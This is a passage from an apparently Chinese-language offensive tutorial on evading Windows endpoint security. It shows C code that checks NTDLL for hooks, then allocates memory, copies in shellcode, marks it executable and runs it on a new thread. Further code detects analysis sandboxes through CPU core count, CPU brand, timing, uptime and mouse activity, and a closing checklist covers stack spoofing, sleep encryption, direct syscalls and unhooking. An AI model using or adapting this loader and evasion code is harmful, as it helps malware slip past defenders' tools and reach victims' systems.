    if (detect_hooks(hNtdll, "NtAllocateVirtualMemory") ||
        detect_hooks(hNtdll, "NtProtectVirtualMemory") ||
        detect_hooks(hNtdll, "NtCreateThreadEx")) {
        printf("Hooks still detected after unhooking\n");
        return FALSE;
    }
    
    // 现在可以安全地使用系统调用了
    PVOID allocated_memory = NULL;
    SIZE_T memory_size = shellcode_size;
    ULONG old_protect;
    HANDLE hThread;
    
    // 使用系统调用分配内存
    typedef NTSTATUS (WINAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    typedef NTSTATUS (WINAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    typedef NTSTATUS (WINAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
    
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &allocated_memory,
        0,
        &memory_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!NT_SUCCESS(status)) return FALSE;
    
    memcpy(allocated_memory, shellcode, shellcode_size);
    
    status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &allocated_memory,
        &memory_size,
        PAGE_EXECUTE_READ,
        &old_protect
    );
    
    if (!NT_SUCCESS(status)) {
        VirtualFree(allocated_memory, 0, MEM_RELEASE);
        return FALSE;
    }
    
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        allocated_memory,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );
    
    if (!NT_SUCCESS(status)) {
        VirtualFree(allocated_memory, 0, MEM_RELEASE);
        return FALSE;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(allocated_memory, 0, MEM_RELEASE);
    
    return TRUE;
}
```

---

## 沙箱检测

### CPU核心检测
```c
// sandbox_detection.c
#include <windows.h>
#include <stdio.h>

// 检测CPU核心数
BOOL check_cpu_cores() {
    SYSTEM_INFO sys_info;
    GetSystemInfo(&sys_info);
    
    DWORD core_count = sys_info.dwNumberOfProcessors;
    printf("CPU Core Count: %d\n", core_count);
    
    // 沙箱通常只有1-2个核心
    if (core_count < 4) {
        printf("Suspicious: Low CPU core count (possible sandbox)\n");
        return TRUE;
    }
    
    return FALSE;
}

// 检测CPU品牌
BOOL check_cpu_brand() {
    char cpu_brand[49] = {0};
    
    // 使用CPUID指令获取CPU信息
    __asm {
        mov eax, 0x80000002
        cpuid
        mov dword ptr [cpu_brand], eax
        mov dword ptr [cpu_brand+4], ebx
        mov dword ptr [cpu_brand+8], ecx
        mov dword ptr [cpu_brand+12], edx
        
        mov eax, 0x80000003
        cpuid
        mov dword ptr [cpu_brand+16], eax
        mov dword ptr [cpu_brand+20], ebx
        mov dword ptr [cpu_brand+24], ecx
        mov dword ptr [cpu_brand+28], edx
        
        mov eax, 0x80000004
        cpuid
        mov dword ptr [cpu_brand+32], eax
        mov dword ptr [cpu_brand+36], ebx
        mov dword ptr [cpu_brand+40], ecx
        mov dword ptr [cpu_brand+44], edx
    }
    
    printf("CPU Brand: %s\n", cpu_brand);
    
    // 检查是否为虚拟机
    if (strstr(cpu_brand, "Virtual") || strstr(cpu_brand, "VMware") || 
        strstr(cpu_brand, "Xeon") || strstr(cpu_brand, "Core(TM) i3")) {
        printf("Suspicious: Virtual CPU detected\n");
        return TRUE;
    }
    
    return FALSE;
}
```

### 运行时间检测
```c
// execution_time_detection.c
#include <windows.h>
#include <stdio.h>

// 检测运行时间
BOOL check_execution_time() {
    DWORD start_time = GetTickCount();
    
    // 执行一些耗时的操作
    for (int i = 0; i < 1000000; i++) {
        // 空循环，消耗时间
        __asm nop
    }
    
    DWORD end_time = GetTickCount();
    DWORD execution_time = end_time - start_time;
    
    printf("Execution time: %d ms\n", execution_time);
    
    // 沙箱通常会加速执行
    if (execution_time < 100) { // 正常应该需要更多时间
        printf("Suspicious: Execution time too fast (possible sandbox)\n");
        return TRUE;
    }
    
    return FALSE;
}

// 检测系统运行时间
BOOL check_system_uptime() {
    DWORD uptime = GetTickCount();
    
    printf("System uptime: %d ms (%d minutes)\n", uptime, uptime / 60000);
    
    // 沙箱通常是新启动的系统
    if (uptime < 3600000) { // 小于1小时
        printf("Suspicious: System uptime too short (possible sandbox)\n");
        return TRUE;
    }
    
    return FALSE;
}
```

### 鼠标移动检测
```c
// mouse_detection.c
#include <windows.h>
#include <stdio.h>

// 检测鼠标移动
BOOL check_mouse_movement() {
    POINT initial_pos;
    GetCursorPos(&initial_pos);
    
    printf("Initial mouse position: (%d, %d)\n", initial_pos.x, initial_pos.y);
    
    // 等待用户移动鼠标
    DWORD start_time = GetTickCount();
    BOOL mouse_moved = FALSE;
    
    while (GetTickCount() - start_time < 10000) { // 等待10秒
        POINT current_pos;
        GetCursorPos(&current_pos);
        
        // 检查鼠标是否移动
        if (abs(current_pos.x - initial_pos.x) > 5 || abs(current_pos.y - initial_pos.y) > 5) {
            mouse_moved = TRUE;
            printf("Mouse moved to: (%d, %d)\n", current_pos.x, current_pos.y);
            break;
        }
        
        Sleep(100); // 检查间隔
    }
    
    if (!mouse_moved) {
        printf("Suspicious: No mouse movement detected (possible sandbox)\n");
        return TRUE;
    }
    
    return FALSE;
}

// 检测鼠标点击
BOOL check_mouse_clicks() {
    printf("Please click the mouse button...\n");
    
    // 记录初始点击状态
    int initial_clicks = GetAsyncKeyState(VK_LBUTTON) + GetAsyncKeyState(VK_RBUTTON);
    
    DWORD start_time = GetTickCount();
    BOOL clicked = FALSE;
    
    while (GetTickCount() - start_time < 15000) { // 等待15秒
        int current_clicks = GetAsyncKeyState(VK_LBUTTON) + GetAsyncKeyState(VK_RBUTTON);
        
        if (current_clicks != initial_clicks) {
            clicked = TRUE;
            printf("Mouse click detected\n");
            break;
        }
        
        Sleep(100);
    }
    
    if (!clicked) {
        printf("Suspicious: No mouse clicks detected (possible sandbox)\n");
        return TRUE;
    }
    
    return FALSE;
}
```

---

## 实战检查清单

### 内存扫描规避
- [ ] 堆栈欺骗技术已实现
- [ ] 假返回地址已配置
- [ ] 线程上下文已修改
- [ ] 动态堆栈欺骗已启用

### 内存加密
- [ ] AES内存加密已配置
- [ ] 睡眠加密已实现
- [ ] Ekko保护已部署
- [ ] 定时器回调已设置

### API Hooking绕过
- [ ] 直接系统调用已实现
- [ ] 间接系统调用已配置
- [ ] 动态系统调用解析已完成
- [ ] 系统调用地址已验证

### Unhooking技术
- [ ] NTDLL unhooking已实现
- [ ] 钩子检测已配置
- [ ] 直接系统调用已准备
- [ ] 清理机制已设置

### 沙箱检测
- [ ] CPU核心检测已配置
- [ ] 运行时间检测已实现
- [ ] 鼠标移动检测已设置
- [ ] 系统运行时间已检查